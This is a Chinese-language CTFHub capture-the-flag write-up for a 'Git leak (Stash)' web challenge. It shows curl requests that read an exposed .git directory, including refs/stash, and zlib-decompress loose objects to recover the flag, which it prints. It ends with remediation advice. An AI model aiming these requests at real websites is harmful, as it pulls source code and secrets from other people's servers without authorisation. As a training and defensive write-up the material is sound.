CTFHub - Web - 信息泄露 - Git泄露（Stash）

# CTFHub # Web # 信息泄露 # Git # Stash

一、题目信息

  • 题目名称：Git泄露 - Stash
  • 题目方向：Web - 信息泄露
  • 题目提示：站点自动部署时错误公开了 .git 目录，需要恢复仓库中的隐藏内容。
  • 解题目标：从 Git stash 保存的临时工作现场中恢复 Flag。

二、漏洞原理

Git 的 stash 用于临时保存尚未提交的工作区修改。执行 git stash 后，Git 会创建一个特殊的 stash commit，并把引用保存在 .git/refs/stash 中。

stash commit 通常包含两个父提交：一个对应原分支，另一个对应当时的索引状态，同时它拥有自己的 tree。即使这些修改没有进入正常分支历史，只要 Web 服务公开了 .git，就可以通过引用和 loose object 将该工作现场完整恢复。

三、解题步骤

  1. 确认 Git 目录泄露：访问 /.git/HEAD，返回 200 OK，指向 refs/heads/master。 
    curl.exe -i "http://challenge-xxx.sandbox.ctfhub.com:10800/.git/HEAD"

HTTP/1.1 200 OK
ref: refs/heads/master
  2. 检查分支提交和 HEAD 日志：当前 master 指向 2234ea7c90ee0e3002f3829efa0fb11d41b8d1a4。日志中存在“add flag”和“remove flag”提交，但最新工作区没有 Flag。 
    curl.exe "http://challenge-xxx.sandbox.ctfhub.com:10800/.git/refs/heads/master"
curl.exe "http://challenge-xxx.sandbox.ctfhub.com:10800/.git/logs/HEAD"
  3. 发现 stash 引用：题目名为 Stash，因此继续读取 refs/stash 和对应的 reflog： 
    curl.exe "http://challenge-xxx.sandbox.ctfhub.com:10800/.git/refs/stash"

819b39c135bd3a43dd4b4e6354cf44fd85b9ffe0
    reflog 显示该对象是 WIP on master: 64811d6 add flag，说明需要恢复已被 stash 保存的工作现场。
  4. 解析 stash commit：下载 SHA-1 对应的 loose object，并使用 zlib 解压。Git 对象解压后的格式为 类型 长度\0内容。 
    curl.exe -o stash.z "http://challenge-xxx.sandbox.ctfhub.com:10800/.git/objects/81/9b39c135bd3a43dd4b4e6354cf44fd85b9ffe0"

python -c "import zlib; print(zlib.decompress(open('stash.z','rb').read()).decode())"
    stash commit 内容如下： 
    commit 281
tree 60e25b35215763defc1a743a73386cd9bd6f9083
parent 64811d690b7e238f43dc1848db78366382194157
parent 13cb800371870caca5be8cbf47b7e11cb14425b4
author CTFHub <sandbox@ctfhub.com> 1789987627 +0000
committer CTFHub <sandbox@ctfhub.com> 1789987627 +0000

WIP on master: 64811d6 add flag
  5. 递归恢复 stash tree：从 commit 的 tree 60e25b35215763defc1a743a73386cd9bd6f9083 开始，解析 tree 条目并继续下载其引用的 blob。恢复出的文件包含： 
    2719593894302.txt
50x.html
index.html
    也可以先使用 GitHack 恢复仓库，再进入恢复目录执行 git stash list 和 git stash show -p 检查 stash。
  6. 读取 Flag：打开随机名称的文件 2719593894302.txt： 
    ctfhub{a74c54f68bc500222b7ffa0e}
提示：stash 的内容不属于当前分支的正常提交链，只沿 HEAD 的 parent 回溯可能会遗漏。发现 Git 泄露后应同时检查 refs/stash、reflog、index、packed-refs 和悬空对象。

四、最终 Flag

ctfhub{a74c54f68bc500222b7ffa0e}

五、修复建议

  • 禁止 Web 服务器访问 .git、.svn、.hg 等版本控制目录。
  • 部署时只发布构建产物，不要将包含完整仓库元数据的目录放到 Web 根目录。
  • 使用 Nginx 或 Apache 统一拦截隐藏文件和敏感路径。
  • 若敏感信息曾进入 stash、提交历史或悬空对象，应轮换相关凭据并清理 Git 历史。
  • 上线检查时验证 /.git/HEAD、/.git/refs/stash 等路径均返回 404。

六、解题总结

本题的关键是识别 Git stash 引用。只恢复 master 当前版本或普通提交历史无法得到 Flag，而 refs/stash 指向的 commit 保存了额外的 tree 和 blob。通过解析 loose object 并递归恢复该 tree，最终从 stash 工作现场中提取出 Flag。
